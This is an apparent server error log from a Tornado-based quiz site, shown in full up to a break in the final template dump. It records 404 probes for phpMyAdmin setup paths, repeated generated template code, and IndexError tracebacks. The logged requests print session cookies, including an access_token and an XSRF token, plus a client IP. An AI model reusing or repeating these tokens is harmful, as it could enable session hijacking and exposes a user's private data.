WARNING:root:404 GET /phpMyAdmin/scripts/setup.php (127.0.0.1) 1.10ms
WARNING:root:404 GET /phpmyadmin/scripts/setup.php (127.0.0.1) 1.15ms
WARNING:root:404 GET /pma/scripts/setup.php (127.0.0.1) 1.09ms
WARNING:root:404 GET /myadmin/scripts/setup.php (127.0.0.1) 1.12ms
WARNING:root:404 GET /MyAdmin/scripts/setup.php (127.0.0.1) 1.21ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.78ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.29ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505f3a9d8e4c85480ff4f8d4&answers=%5B0%5D&cursor=2&_xsrf=ce7d9e810e464e19848ed72d59f4a783', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.100.29.65', 'Cookie': '_xsrf=ce7d9e810e464e19848ed72d59f4a783; access_token="QUFBRzZsTmNzNkdjQkFBOTU5SGowU2pxTTd6UlJIS1pCMTY5NHEyZEFBRTBNUHdpYjMzb3NqU3JFMzMyWVpBZlIzUlhFYnhBMzB0VDVlekJBR3ZiTW51YW4wbjdaQ1JxZWdZZWIwc1Mzd1pEWkQ=|1348415370|e77e7d22e9cf7bf4faf49878c52c82482f8e42a6"; __utma=188782963.1367876954.1348415328.1348415328.1348417904.2; __utmb=188782963.2.10.1348417904; __utmc=188782963; __utmz=188782963.1348415328.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 156.10ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505f3a9d8e4c85480ff4f8d4&answers=%5B3%5D&cursor=6&_xsrf=ce7d9e810e464e19848ed72d59f4a783', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.100.29.65', 'Cookie': '_xsrf=ce7d9e810e464e19848ed72d59f4a783; access_token="QUFBRzZsTmNzNkdjQkFBOTU5SGowU2pxTTd6UlJIS1pCMTY5NHEyZEFBRTBNUHdpYjMzb3NqU3JFMzMyWVpBZlIzUlhFYnhBMzB0VDVlekJBR3ZiTW51YW4wbjdaQ1JxZWdZZWIwc1Mzd1pEWkQ=|1348415370|e77e7d22e9cf7bf4faf49878c52c82482f8e42a6"; __utma=188782963.1367876954.1348415328.1348415328.1348417904.2; __utmb=188782963.2.10.1348417904; __utmc=188782963; __utmz=188782963.1348415328.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 126.64ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
